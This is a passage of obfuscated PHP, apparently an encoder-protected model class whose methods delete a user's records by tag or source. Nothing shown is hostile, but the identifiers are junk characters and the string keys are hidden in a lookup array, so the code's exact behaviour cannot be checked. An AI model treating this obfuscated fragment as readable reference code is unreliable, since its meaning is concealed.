$‡µÑÑ²») { $£îÜ›Ğí =& $_SERVER[ü¢ÙÊñÛ]; if (!Model($£îÜ›Ğí[2227])->listData($‡µÑÑ²»)) { return !1; } if (is_array($ìü‘¹°ä)) { $ìü‘¹°ä = array($£îÜ›Ğí[17], $ìü‘¹°ä); } $‹ßĞ«Á = array($£îÜ›Ğí[1750] => USER_ID, $£îÜ›Ğí[568] => $‡µÑÑ²», $£îÜ›Ğí[506] => $ìü‘¹°ä); return $this->where($‹ßĞ«Á)->delete(); } protected function removeByTag($î­¶çšã) { $¯ÜşÇ†¨ =& $_SERVER[ü¢ÙÊñÛ]; if (!$î­¶çšã) { return !1; } $®÷¨úªƒ = array($¯ÜşÇ†¨[1750] => USER_ID, $¯ÜşÇ†¨[568] => $î­¶çšã); return $this->where($®÷¨úªƒ)->delete(); } protected function removeBySource($úúâ½Â£) { $¸¡èÑò™ =& $_SERVER[ü¢ÙÊñÛ]; if (is_array($úúâ½Â£)) { $úúâ½Â£ = array($¸¡èÑò™[17], $úúâ½Â£); } $÷Ğ¾‰ = array($¸¡èÑò™[1750] => USER_ID, $¸¡èÑò™[568] => array($¸¡èÑò™[1080], 0), $¸¡èÑò™[506] => $úúâ½Â£); return $this->where($÷Ğ¾‰)->delete(); } }